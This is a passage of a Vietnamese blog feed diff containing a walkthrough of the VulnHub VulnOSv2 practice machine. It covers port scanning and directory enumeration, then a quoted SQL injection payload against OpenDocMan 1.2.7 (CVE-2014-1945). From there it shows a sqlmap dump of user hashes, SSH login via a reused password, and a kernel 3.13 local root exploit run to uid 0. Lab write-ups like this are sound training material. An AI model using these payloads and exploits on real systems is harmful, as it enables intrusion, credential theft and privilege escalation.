+Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-02-03 <span class="token number">15</span>:41 +07
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.103
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00064s latency<span class="token punctuation">)</span>.
 
 PORT     STATE SERVICE VERSION
-22&#x2F;tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
-|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
-|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
-|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
-80&#x2F;tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)
-|_http-title: VulnOSv2
-6667&#x2F;tcp open  irc     ngircd
-Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6.6</span>.1p1 Ubuntu 2ubuntu2.6 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">1024</span> f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">2048</span> ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">71</span>:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.7 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-server-header: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: VulnOSv2
+<span class="token number">6667</span>/tcp <span class="token function">open</span>  irc     ngircd
+Service Info: Host: irc.example.net<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
-Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">available databases [6]:
-[*] drupal7
-[*] information_schema
-[*] jabcd0cs
-[*] mysql
-[*] performance_schema
-[*] phpmyadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">18.66</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Có cái cổng 6667 chạy dịch vụ đéo gì kia, <em>irc</em>, wtf!? Không vội cắm mặt vào cái này, chả đi đến đâu đâu, tôi thử rồi :/<br>Tập trung vào cái http server của nó đã.<br><img src="1.png"><br>Nhìn cái mặt tiền web site này u tối như chợ đen (đen đúng nghĩa đen). <em>Enumerate</em> cái URL này để kiếm file ẩn.</p>
+<h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">..</span>.bla<span class="token punctuation">..</span>.bla<span class="token punctuation">..</span>.bla<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -   10KB - /jabc/includes/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -  117KB - /jabc/includes/bootstrap.inc
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -    9KB - /jabc/index.php
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -    3KB - /jabc/install.php
+<span class="token punctuation">[</span><span class="token number">22</span>:05:28<span class="token punctuation">]</span> <span class="token number">301</span> -  315B  - /jabc/misc  -<span class="token operator">></span>  http://10.10.10.103/jabc/misc/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:28<span class="token punctuation">]</span> <span class="token number">301</span> -  318B  - /jabc/modules  -<span class="token operator">></span>  http://10.10.10.103/jabc/modules/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:28<span class="token punctuation">]</span> <span class="token number">200</span> -    9KB - /jabc/modules/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">301</span> -  319B  - /jabc/profiles  -<span class="token operator">></span>  http://10.10.10.103/jabc/profiles/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -  743B  - /jabc/profiles/standard/standard.info
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -  278B  - /jabc/profiles/testing/testing.info
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -  271B  - /jabc/profiles/minimal/minimal.info
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /jabc/robots.txt
+<span class="token punctuation">[</span><span class="token number">22</span>:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  318B  - /jabc/scripts  -<span class="token operator">></span>  http://10.10.10.103/jabc/scripts/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:32<span class="token punctuation">]</span> <span class="token number">200</span> -  949B  - /jabc/scripts/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  316B  - /jabc/sites  -<span class="token operator">></span>  http://10.10.10.103/jabc/sites/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:33<span class="token punctuation">]</span> <span class="token number">301</span> -  320B  - /jabc/templates  -<span class="token operator">></span>  http://10.10.10.103/jabc/templates/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:33<span class="token punctuation">]</span> <span class="token number">200</span> -  976B  - /jabc/templates/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:34<span class="token punctuation">]</span> <span class="token number">301</span> -  317B  - /jabc/themes  -<span class="token operator">></span>  http://10.10.10.103/jabc/themes/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /jabc/themes/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:34<span class="token punctuation">]</span> <span class="token number">403</span> -    4KB - /jabc/update.php
+<span class="token punctuation">[</span><span class="token number">22</span>:05:35<span class="token punctuation">]</span> <span class="token number">200</span> -   42B  - /jabc/xmlrpc.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Nền tảng Drupal, phiên bản 7.26, kiếm được ở đâu thì ở đây nhé.<br><em>/jabc/profiles/standard/standard.info</em></p>
+<pre class="line-numbers language-none"><code class="language-none">Information added by Drupal.org packaging script on 2014-01-15
+version &#x3D; &quot;7.26&quot;
+project &#x3D; &quot;drupal&quot;
+datestamp &#x3D; &quot;1389815930&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Cái đìn địz! Cái chỗ file/folder này khiến tôi mất thời gian thực sự nhiều, toàn trap hết, đây là kết luận của tôi sau 15 phút mò mẫm hết cái đống này và chả kiếm chác thêm được gì có giá trị. Quay trở lại với mặt tiền đen xì xì kia, có đoạn này.<br><img src="2.png"><br>Cái trò nền đen chữ đen này xưa như trái đất rồi nhé tml!<br>Login vào một web site khác với tài khoản và mật khẩu là guest/guest.<br><em>Cảm thấy tiếc thời gian vào cái đống file enumerate vcl</em><br><img src="3.png"><br>Để ý thấy OpenDocMan v1.2.7. Search lỗi về thằng này ngay và luôn.<br><img src="4.png"><br><a href="https://www.exploit-db.com/exploits/32075">https://www.exploit-db.com/exploits/32075</a></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span><span class="token punctuation">)</span> SQL Injection <span class="token keyword">in</span> OpenDocMan: CVE-2014-1945
+
+The vulnerability exists due to insufficient validation of <span class="token string">"add_value"</span> HTTP GET parameter <span class="token keyword">in</span> <span class="token string">"/ajax_udf.php"</span> script. A remote unauthenticated attacker can execute arbitrary SQL commands <span class="token keyword">in</span> application's database.
+
+The exploitation example below displays version of the MySQL server:
+
+http://<span class="token punctuation">[</span>host<span class="token punctuation">]</span>/ajax_udf.php?q<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">add_value</span><span class="token operator">=</span>odm_user%20UNION%20SELECT%201,v
+ersion%28%29,3,4,5,6,7,8,9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Rõ ràng =)) ném thằng vào Sqlmap chứ còn gì nữa.</p>
+<h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Database: jabcd0cs                                                                                                       
+Table: odm_user
+<span class="token punctuation">[</span><span class="token number">3</span> entries<span class="token punctuation">]</span>
++----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> Email              <span class="token operator">|</span> phone       <span class="token operator">|</span> password                                 <span class="token operator">|</span> username <span class="token operator">|</span> last_name <span class="token operator">|</span> department <span class="token operator">|</span> first_name <span class="token operator">|</span> pw_reset_code <span class="token operator">|</span>
++----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+
+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> webmin@example.com <span class="token operator">|</span> <span class="token number">5555551212</span>  <span class="token operator">|</span> b78aae356709f8c31118ea613980954b         <span class="token operator">|</span> webmin   <span class="token operator">|</span> min       <span class="token operator">|</span> <span class="token number">2</span>          <span class="token operator">|</span> web        <span class="token operator">|</span> <span class="token operator">&lt;</span>blank<span class="token operator">></span>       <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> guest@example.com  <span class="token operator">|</span> <span class="token number">555</span> <span class="token number">5555555</span> <span class="token operator">|</span> 084e0343a0486ff05530df6c705c8bb4 <span class="token punctuation">(</span>guest<span class="token punctuation">)</span> <span class="token operator">|</span> guest    <span class="token operator">|</span> guest     <span class="token operator">|</span> <span class="token number">2</span>          <span class="token operator">|</span> guest      <span class="token operator">|</span> NULL          <span class="token operator">|</span>
++----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="5.png"><br><code>b78aae356709f8c31118ea613980954b:webmin1980</code><br>Đến đây lại mất thêm thời gian để mò mẫm xem admin có làm gì được thêm không, có upload file, enable extention file để upload shell bla bla… đều đéo được :)<br>Một kinh nghiệm được rút ra khi tôi làm bài Writeup-HackTheBox, đó là tài khoản đăng nhập trên Http server hoàn toàn có thể đăng nhập được cả trên SSH, vì sao? Vì con người ấy mà, để tránh phải nhớ nhiều account trên một hệ thống, họ thường có xu hướng để cmn giống hệt nhau.<br>Xét cho cùng, thì con người vẫn luôn là điểm yếu nhất của hệ thống.<br><img src="6.png"></p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Vì có được mật khẩu của user webmin, nên tôi không ngại khoản chạy lệnh sudo, chỉ là sudoer đéo cho tôi vào danh sách thôi :v<br>Để ý thấy phiên bản kernel hệ điều hành đang chạy là 3.13, hàng cổ đấy, và tôi biết thừa là nó dính lỗi leo quyền vì tôi từng gặp rồi :)))<br><a href="https://www.exploit-db.com/exploits/33824">https://www.exploit-db.com/exploits/33824</a><br><img src="7.png"></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">webmin@VulnOSv2:~/duma$ gcc <span class="token number">37292</span>.c -o i_am_groot
+webmin@VulnOSv2:~/duma$ ./i_am_groot 
+spawning threads
+<span class="token function">mount</span> <span class="token comment">#1</span>
+<span class="token function">mount</span> <span class="token comment">#2</span>
+child threads <span class="token keyword">done</span>
+/etc/ld.so.preload created
+creating shared library
+<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1001<span class="token punctuation">(</span>webmin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Done!</p>
+]]></content>
+      <categories>
+        <category>VulnHub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>easy</tag>
+      </tags>
   </entry>
   <entry>
     <title>[VulnHub] Mr.Robot</title>
